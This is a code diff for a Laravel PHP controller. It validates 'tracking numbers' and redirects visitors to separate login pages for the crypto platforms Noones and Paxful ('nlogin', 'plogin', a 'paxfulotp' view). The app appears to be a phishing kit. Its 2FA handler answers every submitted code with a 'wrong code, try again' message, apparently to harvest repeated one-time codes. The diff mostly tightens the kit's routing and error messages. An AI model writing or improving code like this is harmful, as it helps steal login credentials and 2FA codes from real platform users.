@@ -17,7 +17,14 @@ class PaymentController extends Controller
 
         // dd($request->tracking_number);
 
-        $trackingNumber = $request->tracking_number; // keep as string
+        $trackingNumber = $request->tracking_number;
+
+        if (!is_numeric($trackingNumber) || strpos($trackingNumber, '.') !== false) {
+            return redirect()->back()->withErrors([
+                'tracking_number' => 'Tracking number must be a valid integer.'
+            ]);
+        }
+
 
         // Get the first 4 characters (including leading 0s)
         $prefix = substr($trackingNumber, 0, 4); // e.g., "0100"
@@ -32,25 +39,24 @@ class PaymentController extends Controller
 
         //now check if this number is on the database
 
-        $payment=Payment::findOrFail($numberInt);
+        $payment = Payment::where('id', $numberInt)->first(); // fetch a single model
 
-        if ($payment) {
-            
-            $id = $payment->id;
-            $platform = strtolower(trim($request->platform)); // normalize input
-        
-            // Determine the redirect path
-            $path = $platform === 'noones' ? 'nlogin' : 'plogin';
-        
-            return redirect()->to(url("/$path/$id"));
+        if (!$payment) {
+            return redirect()->back()->withErrors([
+                'tracking_number' => 'Invalid tracking number.'
+            ]);
         }
         
-        return redirect()->back()->withErrors([
-            'tracking_number' => 'Invalid tracking number.'
-        ]);
+        $id = $payment->id;
+        $platform = strtolower(trim($payment->platform));
         
-
-        return $payment;
+        if ($platform === 'noones') {
+            return redirect("/nlogin/$id");
+        } else {
+            return redirect("/plogin/$id");
+        }
+        
+       
     }
 
 
@@ -115,7 +121,7 @@ class PaymentController extends Controller
         // Log::info("2FA code submitted: $code");
 
         // Redirect somewhere with success message
-        return redirect()->back()->with('message', '2FA Code is wrong.');
+        return redirect()->back()->with('message', 'Incorrect code! Try again');
     }
 public function getOtpForm(){
     return view('paxfulotp');
